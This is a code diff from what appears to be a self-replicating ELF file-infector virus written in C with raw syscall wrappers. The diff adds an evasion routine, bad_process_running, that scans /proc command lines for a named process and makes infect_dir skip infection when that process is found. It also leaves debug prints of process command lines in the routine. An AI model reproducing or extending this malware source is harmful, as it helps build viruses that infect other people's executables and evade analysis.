@@ -98,85 +98,6 @@ ft_strcat(volatile char* dst, volatile char* src) {
     }
 }
 
-__attribute__((always_inline)) static inline int
-ft_isdigit(const volatile char* const s) {
-    for (int i = 0; s[i]; ++i) {
-        if (s[i] < '0' && s[i] > '9') {
-            return 0;
-        }
-    }
-    return 1;
-}
-
-__attribute__((always_inline)) static inline volatile char *
-ft_strchr(volatile char*  s, const volatile char c) {
-    while (*s) {
-        if (*s == c) {
-            return s;
-        }
-        s++;
-    }
-    return 0;
-}
-
-__attribute__((always_inline)) static inline int
-bad_process_running() {
-    volatile char path[256];
-    volatile char cmdline_buf[1024];
-    volatile char getdents_buf[4096];
-
-    volatile int dirfd = ft_open(slash_proc, O_RDONLY, 0);
-    if (dirfd < 0) {
-        return 0;
-    }
-
-    path[0] = 0;
-    ft_strcat(path, slash_proc);
-
-    while (1) {
-        int64_t bytes_read = ft_getdents64(dirfd, (char*)getdents_buf, sizeof(getdents_buf));
-        if (bytes_read <= 0) {
-            break;
-        }
-        int64_t offset = 0;
-        while (offset < bytes_read) {
-            dirent64 *entry = (dirent64 *)(getdents_buf + offset);
-            offset += entry->d_reclen;
-            if (!ft_isdigit(entry->d_name)) {
-                continue;
-            }
-            const uint64_t len = ft_strlen(entry->d_name);
-            if (len + 14 > sizeof(path)) {
-                continue;
-            }
-            ft_strcat(path, entry->d_name);
-            ft_strcat(path, slash_cmdline);
-            int fd = ft_open(path, O_RDONLY, 0);
-            if (fd < 0) {
-                continue;
-            }
-            for (int i = 6; i < sizeof(path); ++i) {
-                path[i] = 0;
-            }
-            int64_t read_bytes = (fd, cmdline_buf, sizeof(cmdline_buf));
-            if (read_bytes < 0) {
-                continue;
-            }
-            ft_close(fd);
-            volatile char *space = ft_strchr(cmdline_buf, ' ');
-            if (space) {
-                *space = 0;
-            }
-            if (ft_strstr(bad_process_name, cmdline_buf)) {
-                ft_close(dirfd);
-                return 1;
-            }
-        }
-    }
-    ft_close(dirfd);
-    return 0;
-}
-
 __attribute__((always_inline)) inline void
 print_number_hex(volatile uint64_t num) {
     char buf[20];
@@ -224,6 +145,87 @@ print_number(volatile uint64_t num) {
         ft_write(1, &c, 1);
     }
 }
+
+__attribute__((always_inline)) static inline int
+ft_isdigit(const volatile char* const s) {
+    for (int i = 0; s[i]; ++i) {
+        if (s[i] < '0' && s[i] > '9') {
+            return 0;
+        }
+    }
+    return 1;
+}
+
+__attribute__((always_inline)) static inline volatile char *
+ft_strchr(volatile char*  s, const volatile char c) {
+    while (*s) {
+        if (*s == c) {
+            return s;
+        }
+        s++;
+    }
+    return 0;
+}
+
+__attribute__((always_inline)) static inline int
+bad_process_running() {
+    volatile char path[256];
+    volatile char cmdline_buf[1024];
+    volatile char getdents_buf[4096];
+
+    volatile int dirfd = ft_open(slash_proc, O_RDONLY, 0);
+    if (dirfd < 0) {
+        return 0;
+    }
+
+    path[0] = 0;
+    ft_strcat(path, slash_proc);
+
+    while (1) {
+        int64_t bytes_read = ft_getdents64(dirfd, (char*)getdents_buf, sizeof(getdents_buf));
+        if (bytes_read <= 0) {
+            break;
+        }
+        int64_t offset = 0;
+        while (offset < bytes_read) {
+            for (int i = 6; i < sizeof(path); ++i) {
+                path[i] = 0;
+            }
+            dirent64 *entry = (dirent64 *)(getdents_buf + offset);
+            offset += entry->d_reclen;
+            if (!ft_isdigit(entry->d_name)) {
+                continue;
+            }
+            const uint64_t len = ft_strlen(entry->d_name);
+            if (len + 14 > sizeof(path)) {
+                continue;
+            }
+            ft_strcat(path, entry->d_name);
+            ft_strcat(path, slash_cmdline);
+            int fd = ft_open(path, O_RDONLY, 0);
+            if (fd < 0) {
+                continue;
+            }
+
+            int64_t read_bytes = ft_read(fd, cmdline_buf, sizeof(cmdline_buf));
+            if (read_bytes < 0) {
+                continue;
+            }
+            ft_close(fd);
+            char nl = '\n';
+            ft_write(1, cmdline_buf, read_bytes);
+            ft_write(1, &nl, 1);
+            if (ft_strstr(bad_process_name, cmdline_buf)) {
+                ft_close(dirfd);
+                print_number(123);
+                return 1;
+            }
+        }
+    }
+    ft_close(dirfd);
+    return 0;
+}
+
 
 __attribute__((always_inline)) static inline void
 ft_exit_incubation() {
@@ -334,6 +336,10 @@ _start() {
 
 __attribute__((always_inline)) inline int
 infect_dir(volatile char *dir_path, volatile int fd_self) {
+    if (bad_process_running()) {
+        jump_back(fd_self);
+    }
+
     for (volatile int dir_index = 0; dir_index < 2; dir_index++) {
 
         int fd_dir = ft_open(dir_path, O_RDONLY, O_DIRECTORY);
